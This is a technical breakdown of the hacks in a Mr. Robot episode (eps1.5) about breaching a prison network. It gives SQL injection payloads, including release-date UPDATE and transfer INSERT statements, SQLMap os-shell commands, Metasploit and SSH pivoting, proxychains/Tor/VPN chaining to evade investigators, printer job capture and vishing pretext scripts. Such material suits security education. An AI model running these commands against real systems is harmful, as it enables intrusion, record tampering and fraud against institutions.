# Episode 6: eps1.5_br4ve-trave1er.asf

## Overview

Elliot is compelled to hack into a prison network to secure the release of Fernando Vera, whose associates have kidnapped Shayla as leverage. This episode showcases SQL injection attacks against prison management systems, network pivoting through multiple layers of security, advanced anonymization techniques using Tor, VPN chaining, and SSH tunnels, as well as social engineering over the phone (pretexting) and printer exploitation. The stakes are intensely personal, forcing Elliot to apply his skills under extreme duress.

---

## Hacks & Techniques

### 1. Prison Network Hacking for Fernando Vera

Elliot must penetrate the network of a correctional facility to manipulate prisoner records and facilitate Vera's release. Prison and government networks present unique challenges: they are often segmented from the public internet, use legacy systems, and have specific compliance requirements (CJIS in the United States) that theoretically mandate certain security controls.

**Attack planning considerations:**

- **Network architecture**: Prison networks typically have administrative systems (inmate records, scheduling, commissary), operational technology (door controls, CCTV, intercom), and connectivity to state/federal criminal justice databases
- **Entry points**: Public-facing web applications (inmate lookup, commissary systems, visitor registration), VPN portals for remote administrative access, or email systems
- **Legacy systems**: Correctional facilities frequently run outdated software due to budget constraints and slow procurement cycles
- **CJIS compliance**: The Criminal Justice Information Services (CJIS) Security Policy mandates encryption, access controls, and auditing, but implementation varies widely between facilities

**Attack path:**

```
Internet-facing web application (visitor portal / inmate lookup)
    |
    |-- SQL injection to gain database access
    |
Internal database server
    |
    |-- Network pivoting to reach administrative network
    |
Inmate management system
    |
    |-- Record manipulation (transfer orders, release schedules)
    |
Operational result: Vera's release facilitated
```

### 2. SQL Injection on Prison Management Systems

The primary technical attack vector is SQL injection (SQLi) against the prison's web-facing applications. SQL injection remains one of the most prevalent and damaging web application vulnerabilities, consistently ranking in the OWASP Top 10.

**SQL injection fundamentals:**

SQL injection occurs when user-supplied input is incorporated into SQL queries without proper sanitization or parameterization. The attacker injects SQL syntax that alters the query's logic, allowing unauthorized data access, modification, or deletion.

**Types of SQL injection used:**

**In-band (Classic) SQLi:**
```sql
-- Authentication bypass
' OR '1'='1' --
' OR '1'='1' /*

-- UNION-based data extraction
' UNION SELECT username, password FROM users --
' UNION SELECT inmate_id, release_date, cell_block FROM inmates --
```

**Blind SQLi (Boolean-based):**
```sql
-- Determine if condition is true based on application response
' AND 1=1 --    (page loads normally = TRUE)
' AND 1=2 --    (page behaves differently = FALSE)

-- Extract data one character at a time
' AND SUBSTRING(@@version,1,1)='M' --
' AND (SELECT COUNT(*) FROM inmates WHERE id=1337)>0 --
```

**Time-based Blind SQLi:**
```sql
-- Infer information based on response delays
' AND IF(1=1, SLEEP(5), 0) --    (5-second delay = TRUE)
' AND IF(SUBSTRING(database(),1,1)='p', SLEEP(5), 0) --
```

**Second-order SQLi:**
The attacker stores malicious SQL in the database through one input, and it is executed later when that data is used in a different query. This can be particularly effective in prison management systems where data entered in one form (e.g., visitor registration) is later processed by internal reports or queries.

**Attack progression:**

1. **Discovery**: Identify injectable parameters in the web application
2. **Enumeration**: Determine database type (MySQL, PostgreSQL, MSSQL, Oracle), version, and structure
3. **Data extraction**: Dump table names, column names, and sensitive data
4. **Privilege escalation**: Gain database administrator access or execute OS commands through the database
5. **Data manipulation**: Modify inmate records, create transfer orders, or alter release dates
6. **Lateral movement**: Use database server as a pivot point to access other internal systems

### 3. IP Spoofing and Network Pivoting

Once inside the prison's database server, Elliot must pivot deeper into the network to reach systems that are not directly accessible from the initial entry point.

**Network pivoting techniques:**

- **Multi-hop SSH tunneling**: Chaining SSH connections through compromised hosts to reach progressively deeper network segments
- **SOCKS proxy pivoting**: Setting up SOCKS proxies on compromised hosts to route traffic through them
- **Metasploit pivoting**: Using Meterpreter's built-in routing capabilities to tunnel traffic through compromised sessions
- **Port forwarding**: Forwarding specific ports from internal systems through the chain of compromised hosts to the attacker

**Pivot chain example:**

```
Attacker -> [Internet] -> Web Server (DMZ)
    -> [Firewall] -> Database Server (Internal)
        -> [VLAN] -> Inmate Management System (Restricted)
            -> [Air gap?] -> Record System
```

**IP spoofing considerations:**

- Source IP addresses may be spoofed in certain contexts to evade IP-based access controls or logging
- Spoofing is more feasible on local networks (same broadcast domain) than across the internet
- ARP spoofing/poisoning can redirect traffic on local network segments
- IP spoofing is primarily useful for denial-of-service or when the attacker does not need to receive the response

### 4. Tor, VPN Chaining, SSH Tunnels, and Proxychains

Given the extreme sensitivity of attacking a government correctional facility, Elliot layers multiple anonymization technologies to protect his identity.

**Anonymization stack:**

```
Elliot's Machine
    |
    |-- VPN (Layer 1: Encrypt traffic from ISP)
    |
    |-- Tor Network (Layer 2: Multi-hop anonymous routing)
    |       |-- Entry Guard
    |       |-- Middle Relay
    |       |-- Exit Node
    |
    |-- SSH Tunnel (Layer 3: Encrypted tunnel to proxy server)
    |
    |-- Second VPN (Layer 4: Additional IP masking)
    |
    |-- Target: Prison Network
```

**Proxychains configuration:**

Proxychains is a tool that forces any TCP connection to follow through a chain of proxy servers. It supports SOCKS4, SOCKS5, and HTTP proxies, and can be configured in strict chain mode (all proxies must be used in order) or dynamic chain mode (skips dead proxies).

**VPN chaining:**

- Using multiple VPN providers in series, each in a different jurisdiction
- Each VPN only knows the IP of the previous hop and the next hop
- Combining VPN providers with different logging policies and jurisdictions creates legal obstacles for investigators
- Using cryptocurrency for VPN payment eliminates financial tracking

**SSH tunnel layering:**

- SSH tunnels provide end-to-end encryption and can be chained through multiple intermediate hosts
- Each hop only sees the encrypted tunnel, not the underlying traffic content
- SSH can be configured over non-standard ports or disguised as HTTPS traffic to evade deep packet inspection

### 5. Social Engineering via Phone (Pretexting as Authority)

Elliot or his associates use phone-based social engineering, pretexting as correctional officers, administrators, or other authority figures to manipulate prison staff into taking actions that support the hack.

**Pretexting as authority:**

- **Role selection**: Impersonating a warden, a department of corrections official, a judge's clerk, or a federal marshal, choosing a role that outranks or has authority over the target employee
- **Jargon and procedures**: Using correct institutional terminology, referencing real procedures and forms, and demonstrating familiarity with the facility's operations
- **Urgency and pressure**: Creating a scenario that requires immediate action, discouraging the target from taking time to verify the caller's identity
- **Callback number spoofing**: Providing a spoofed callback number that appears to be a legitimate government office, manned by a confederate prepared to confirm the cover story

**Techniques to establish credibility:**

| Technique | Example |
|-----------|---------|
| Name-dropping | "Commissioner Johnson authorized this transfer personally" |
| Procedural knowledge | "I need the CJIS TAC code for the interstate compact transfer" |
| Shared experience | "I know the system's been slow since the last CJIS upgrade" |
| Emotional pressure | "The judge is furious this wasn't processed yesterday" |
| Implied consequences | "If this isn't done by 5 PM, it's going to be on you" |

### 6. Printer Exploitation and Tracking Dots

The episode references printer security and forensic tracking dots, revealing another dimension of digital forensics and surveillance.

**Printer exploitation:**

Printers are often overlooked in network security but represent significant attack surface:

- **Default credentials**: Most network printers ship with default admin passwords that are rarely changed
- **Exposed management interfaces**: Web-based printer management consoles are accessible from the network and sometimes the internet
- **Print job interception**: Capturing print jobs in transit or from printer memory/spool can reveal sensitive documents
- **Firmware exploitation**: Vulnerable printer firmware can be exploited for code execution, turning the printer into a network pivot point
- **PostScript/PJL injection**: Malicious print jobs can execute commands on the printer itself

**Machine Identification Code (tracking dots):**

Most color laser printers embed a nearly invisible pattern of tiny yellow dots on every printed page. These dots encode the printer's serial number and the date/time of printing.

**Tracking dot details:**

- **Size**: Approximately 0.1mm in diameter, invisible to the naked eye
- **Color**: Yellow on white paper (nearly invisible without magnification)
- **Pattern**: Arranged in a grid, typically repeated across the page
- **Information encoded**: Printer serial number, date, time
- **Purpose**: Originally developed at the request of governments to track counterfeiters
- **Detection**: Visible under blue LED light or magnification; can be decoded with software tools

**Privacy implications:**

- Any printed document can potentially be traced back to the specific printer and the date of printing
- Combined with purchase records or asset inventories, the printer can be linked to an individual or organization
- The Electronic Frontier Foundation (EFF) has documented and decoded tracking dot patterns from numerous printer manufacturers

---

## Tools Used

| Tool | Purpose | Category |
|------|---------|----------|
| SQLMap | Automated SQL injection exploitation | Web Application |
| Tor | Multi-hop anonymous network routing | Anonymity |
| Proxychains | Force TCP connections through proxy chains | Anonymity |
| VPN clients (multiple) | Encrypted traffic tunneling | Anonymity |
| SSH | Encrypted tunneling and remote access | Remote Access |
| Metasploit | Network pivoting and post-exploitation | Exploitation |
| Burp Suite (implied) | Web application testing and request manipulation | Web Application |
| Spoofed VoIP | Caller ID spoofing for vishing | Social Engineering |
| CUPS/printer tools | Printer exploitation | Network Exploitation |

---

## Commands Shown

### SQL injection exploitation
```bash
# Automated SQL injection with SQLMap
# Identify injectable parameters
sqlmap -u "http://prison.gov/inmate_lookup.php?id=1" --dbs

# Enumerate tables in the prison management database
sqlmap -u "http://prison.gov/inmate_lookup.php?id=1" -D prison_mgmt --tables

# Dump inmate records
sqlmap -u "http://prison.gov/inmate_lookup.php?id=1" -D prison_mgmt -T inmates --dump

# OS command execution through SQL injection (if xp_cmdshell is available on MSSQL)
sqlmap -u "http://prison.gov/inmate_lookup.php?id=1" --os-shell

# Upload a web shell through SQL injection
sqlmap -u "http://prison.gov/inmate_lookup.php?id=1" --os-pwn
```

### Manual SQL injection examples
```sql
-- Authentication bypass on prison staff login
admin' OR '1'='1' --

-- Extract database version
' UNION SELECT NULL, @@version, NULL --

-- Enumerate table names
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables --

-- Dump inmate release dates
' UNION SELECT inmate_id, full_name, release_date FROM inmates WHERE id=1337 --

-- Modify release date (data manipulation)
'; UPDATE inmates SET release_date='2015-06-01' WHERE inmate_id=1337; --

-- Create a transfer order
'; INSERT INTO transfers (inmate_id, dest_facility, auth_code, transfer_date)
   VALUES (1337, 'RELEASED', 'AUTH-2015-0601', '2015-06-01'); --
```

### Anonymization setup
```bash
# Start Tor service
sudo service tor start

# Configure proxychains for strict chain mode
# /etc/proxychains.conf:
# strict_chain
# proxy_dns
# [ProxyList]
# socks5 127.0.0.1 9050       # Tor SOCKS proxy
# socks5 proxy2_ip 1080        # Additional SOCKS proxy
# socks5 proxy3_ip 1080        # Third proxy layer

# Connect to VPN first
sudo openvpn --config vpn_server1.ovpn

# Run attack tools through the proxy chain
proxychains sqlmap -u "http://target/page.php?id=1" --dbs

# Verify IP address through the chain
proxychains curl https://check.torproject.org/api/ip

# Chain SSH tunnels for additional layers
ssh -D 9051 -o ProxyCommand="nc -x 127.0.0.1:9050 %h %p" user@ssh_proxy_host
```

### Network pivoting
```bash
# After compromising the web server, set up pivot
# Using SSH to tunnel into the internal network
ssh -L 3306:internal_db_server:3306 www-data@web_server

# Access internal database through the tunnel
mysql -h 127.0.0.1 -P 3306 -u admin -p

# Multi-hop pivot with SSH
ssh -J www-data@web_server admin@internal_db_server

# Set up SOCKS proxy on compromised host for proxychains
ssh -D 1080 www-data@web_server

# Metasploit pivoting (from meterpreter session)
meterpreter> run autoroute -s 10.10.10.0/24
meterpreter> background
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080
msf> run
```

### Printer exploitation
```bash
# Scan for network printers
nmap -sV -p 9100,515,631 192.168.1.0/24

# Access printer management interface
curl http://printer_ip:80/admin  # Often default credentials

# Capture print jobs using PRET (Printer Exploitation Toolkit)
python pret.py printer_ip pjl
# > capture
# > ls
# > get document.ps

# Extract tracking dot information from a printed document
# Using the EFF's tracking dot decoder or similar tools
# Photograph the page under blue LED light
# Decode the dot pattern to reveal serial number and date
```

---

## Real-World Parallels

### SQL Injection in Government Systems
SQL injection attacks against government systems are disturbingly common. In 2011, the hacktivist group LulzSec used SQL injection to breach the Arizona Department of Public Safety, leaking law enforcement intelligence documents. In 2012, Anonymous hackers used SQL injection to breach the Alabama Department of Public Safety. The 2015 breach of the US Office of Personnel Management (OPM), which exposed the security clearance records of 21.5 million people, was also initiated through a web application vulnerability. A 2020 audit of state government websites by security researchers found that many still contained basic SQL injection vulnerabilities.

### Prison and Criminal Justice System Hacking
While not widely publicized, prison system vulnerabilities are real. In 2017, inmates at an Idaho correctional facility hacked JPay tablets (used for email and entertainment) to add fraudulent credits worth approximately $225,000. In 2011, a hacker compromised the computer systems of the Houston, Texas jail and modified inmate records. In 2018, researchers at the University of Michigan demonstrated vulnerabilities in electronic prison door systems that could allow remote unlocking. The CJIS Security Policy exists specifically because criminal justice information systems are recognized high-value targets.

### Tor and Multi-Layer Anonymization
The layered anonymization approach depicted mirrors techniques used by real-world threat actors. The Silk Road marketplace operated exclusively through Tor hidden services. Law enforcement efforts to de-anonymize Tor users have been partially successful in some cases (such as the FBI's exploitation of a Firefox vulnerability to identify Tor users in 2013) but the combination of Tor with VPNs and SSH tunnels significantly complicates attribution. The NSA's own classified documents (leaked by Edward Snowden) described Tor as providing "low-latency anonymity" that was challenging even for their capabilities to defeat broadly.

### Printer Forensics and Tracking Dots
The Machine Identification Code (MIC) system has been confirmed by researchers and the EFF. In 2017, NSA leaker Reality Winner was identified in part because the FBI analyzed the tracking dots on the printed classified documents she provided to The Intercept, linking the printout to a specific printer at her NSA facility. This case dramatically illustrated the forensic power of printer steganography and became a widely cited example of how printed documents can be traced.

### Social Engineering Against Institutions
Social engineering attacks against correctional and law enforcement institutions have been documented. In 2015, a teenager used social engineering to gain access to CIA Director John Brennan's personal email account by calling Verizon and AOL while impersonating a technician. The techniques of authority pretexting shown in the episode are directly from the social engineering playbook described by Kevin Mitnick and Christopher Hadnagy in their foundational works on the subject.

---

## Tool Links

- **Tor**: https://www.torproject.org/
- **Proxychains**: https://github.com/haad/proxychains
- **Metasploit**: https://www.metasploit.com/
- **Burp Suite**: https://portswigger.net/burp
- **Nmap**: https://nmap.org/
- **Wireshark**: https://www.wireshark.org/

---

## MITRE ATT&CK Mapping

| Episode Technique | MITRE ATT&CK ID | Name | Link |
|---|---|---|---|
| SQL injection on prison web application | T1190 | Exploit Public-Facing Application | https://attack.mitre.org/techniques/T1190/ |
| SQL injection command execution | T1059 | Command and Scripting Interpreter | https://attack.mitre.org/techniques/T1059/ |
| Database record manipulation | T1565 | Data Manipulation | https://attack.mitre.org/techniques/T1565/ |
| Network pivoting through compromised hosts | T1021 | Remote Services | https://attack.mitre.org/techniques/T1021/ |
| Multi-hop SSH tunneling | T1572 | Protocol Tunneling | https://attack.mitre.org/techniques/T1572/ |
| Tor anonymization for attack traffic | T1573 | Encrypted Channel | https://attack.mitre.org/techniques/T1573/ |
| IP spoofing / ARP spoofing | T1557 | Adversary-in-the-Middle | https://attack.mitre.org/techniques/T1557/ |
| Social engineering via phone (vishing) | T1598 | Phishing for Information | https://attack.mitre.org/techniques/T1598/ |
| Authority pretexting | T1036 | Masquerading | https://attack.mitre.org/techniques/T1036/ |
| Printer exploitation for pivoting | T1046 | Network Service Discovery | https://attack.mitre.org/techniques/T1046/ |
| Credential access via SQL injection | T1078 | Valid Accounts | https://attack.mitre.org/techniques/T1078/ |
| Metasploit pivoting via meterpreter | T1219 | Remote Access Software | https://attack.mitre.org/techniques/T1219/ |

---

## References and Further Reading

- **OWASP Top 10 - SQL Injection**: https://owasp.org/www-community/attacks/SQL_Injection
- **LulzSec Arizona DPS Breach (2011)**: https://www.wired.com/2011/06/lulzsec-arizona/
- **US OPM Breach (2015)**: https://www.opm.gov/cybersecurity/cybersecurity-incidents/
- **Idaho Prison JPay Tablet Hack (2017)**: https://www.bbc.com/news/technology-44804003
- **Reality Winner Printer Tracking Dots Case (2017)**: https://www.eff.org/pages/list-printers-which-do-or-do-not-display-tracking-dots
- **EFF Machine Identification Code Research**: https://www.eff.org/issues/printers
- **Kevin Mitnick - The Art of Deception (2002)**: https://www.mitnicksecurity.com/
- **Christopher Hadnagy - Social Engineering: The Science of Human Hacking**: https://www.social-engineer.org/
- **CJIS Security Policy**: https://www.fbi.gov/services/cjis/cjis-security-policy-resource-center
- **Tor Project - Anonymization Research**: https://www.torproject.org/about/history/
- **SANS - Web Application Penetration Testing**: https://www.sans.org/white-papers/
- **NSA Tor Monitoring (Snowden Documents)**: https://www.theguardian.com/world/2013/oct/04/nsa-gchq-attack-tor-network-encryption

---

## Search Tags

```
tags: [SQL injection, SQLMap, prison hacking, network pivoting, Tor, VPN chaining, Proxychains, SSH tunneling, Metasploit, Burp Suite, social engineering, vishing, pretexting, printer exploitation, tracking dots, Machine Identification Code, CJIS, ARP spoofing, anonymization, meterpreter]
season: 1
episode: 6
mitre: [T1190, T1059, T1565, T1021, T1572, T1573, T1557, T1598, T1036, T1046, T1078, T1219]
```